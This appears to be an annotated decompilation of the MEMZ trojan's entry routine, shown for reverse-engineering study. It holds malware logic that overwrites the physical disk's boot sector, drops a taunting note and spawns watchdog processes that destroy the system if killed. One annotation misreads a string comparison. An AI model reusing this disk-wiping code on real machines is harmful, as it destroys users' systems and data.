void __noreturn start()
{
  const WCHAR *CommandLineW; // eax
  LPWSTR *v1; // eax
  HANDLE FileA; // ebx
  unsigned int v3; // edi
  _BYTE *v4; // esi
  _BYTE *v5; // ecx
  unsigned int i; // ecx
  HANDLE v7; // esi
  unsigned int v8; // edi
  DWORD *v9; // esi
  WCHAR *v10; // esi
  int v11; // edi
  SHELLEXECUTEINFOW pExecInfo; // [esp+Ch] [ebp-64h] BYREF
  MSG Msg; // [esp+48h] [ebp-28h] BYREF
  DWORD NumberOfBytesWritten; // [esp+64h] [ebp-Ch] BYREF
  HANDLE hObject; // [esp+68h] [ebp-8h]
  int pNumArgs; // [esp+6Ch] [ebp-4h] BYREF

  dword_405184 = GetSystemMetrics(0);//获取屏幕宽度
  dword_405188 = GetSystemMetrics(1);//获取屏幕高度
  CommandLineW = GetCommandLineW();//获取命令行
  v1 = CommandLineToArgvW(CommandLineW, &pNumArgs);


  if ( pNumArgs > 1 ) // 參數多於1個
  {

    if ( !lstrcmpW(v1[1], L"/watchdog") )//不等於 /watchdog
    {
      CreateThread(0, 0, sub_40114A, 0, 0, 0);
      pExecInfo.lpVerb = (LPCWSTR)48;
      pExecInfo.lpParameters = (LPCWSTR)sub_401000;
      pExecInfo.hIcon = (HANDLE)"hax";
      pExecInfo.lpFile = 0;
      memset(&pExecInfo.lpDirectory, 0, 28);
      pExecInfo.hProcess = 0;
      RegisterClassExA((const WNDCLASSEXA *)&pExecInfo.lpVerb);
      CreateWindowExA(0, "hax", 0, 0, 0, 0, 100, 100, 0, 0, 0, 0);
      while ( GetMessageW(&Msg, 0, 0, 0) > 0 )
      {
        TranslateMessage(&Msg);
        DispatchMessageW(&Msg);
      }
    }
    FileA = CreateFileA("\\\\.\\PhysicalDrive0", 0xC0000000, 3u, 0, 3u, 0, 0);
    hObject = FileA;
    if ( FileA == (HANDLE)-1 )
      ExitProcess(2u);
    v3 = 0;
    v4 = LocalAlloc(0x40u, 0x10000u);
    v5 = v4;
    do
    {
      ++v3;
      *v5 = v5[byte_402118 - v4];
      ++v5;
    }
    while ( v3 < 0x12F );
    for ( i = 0; i < 0x7A0; ++i )
      v4[i + 510] = byte_402248[i];
    if ( !WriteFile(FileA, v4, 0x10000u, &NumberOfBytesWritten, 0) )
      ExitProcess(3u);
    CloseHandle(hObject);
    v7 = CreateFileA("\\note.txt", 0xC0000000, 3u, 0, 2u, 0x80u, 0);
    if ( v7 == (HANDLE)-1 )
      ExitProcess(4u);
    if ( !WriteFile(
            v7,
            "YOUR COMPUTER HAS BEEN FUCKED BY THE MEMZ TROJAN.\r\n"
            "\r\n"
            "Your computer won't boot up again,\r\n"
            "so use it as long as you can!\r\n"
            "\r\n"
            ":D\r\n"
            "\r\n"
            "Trying to kill MEMZ will cause your system to be\r\n"
            "destroyed instantly, so don't try it :D",
            0xDAu,
            &NumberOfBytesWritten,
            0) )
      ExitProcess(5u);
    CloseHandle(v7);
    ShellExecuteA(0, 0, "notepad", "\\note.txt", 0, 10);
    v8 = 0;
    v9 = (DWORD *)&off_405130;
    do
    {
      Sleep(v9[1]);
      CreateThread(0, 0, sub_401A2B, v9, 0, 0);
      ++v8;
      v9 += 2;
    }
    while ( v8 < 0xA );
    while ( 1 )
      Sleep(0x2710u);
  }
  if ( MessageBoxA(
         0,
         "The software you just executed is considered malware.\r\n"
         "This malware will harm your computer and makes it unusable.\r\n"
         "If you are seeing this message without knowing what you just executed, simply press No and nothing will happen."
         "\r\n"
         "If you know what this malware does and are using a safe environment to test, press Yes to start it.\r\n"
         "\r\n"
         "DO YOU WANT TO EXECUTE THIS MALWARE, RESULTING IN AN UNUSABLE MACHINE?",
         "MEMZ",
         0x34u) == 6
    && MessageBoxA(
         0,
         "THIS IS THE LAST WARNING!\r\n"
         "\r\n"
         "THE CREATOR IS NOT RESPONSIBLE FOR ANY DAMAGE MADE USING THIS MALWARE!\r\n"
         "STILL EXECUTE IT?",
         "MEMZ",
         0x34u) == 6 )
  {
    v10 = (WCHAR *)LocalAlloc(0x40u, 0x4000u);
    GetModuleFileNameW(0, v10, 0x2000u);
    v11 = 5;
    do
    {
      ShellExecuteW(0, 0, v10, L"/watchdog", 0, 10);
      --v11;
    }
    while ( v11 );
    pExecInfo.cbSize = 60;
    pExecInfo.lpFile = v10;
    pExecInfo.lpParameters = L"/main";
    pExecInfo.fMask = 64;
    pExecInfo.hwnd = 0;
    pExecInfo.lpVerb = 0;
    pExecInfo.lpDirectory = 0;
    pExecInfo.hInstApp = 0;
    pExecInfo.nShow = 10;
    ShellExecuteExW(&pExecInfo);
    SetPriorityClass(pExecInfo.hProcess, 0x80u);
  }
  ExitProcess(0);
}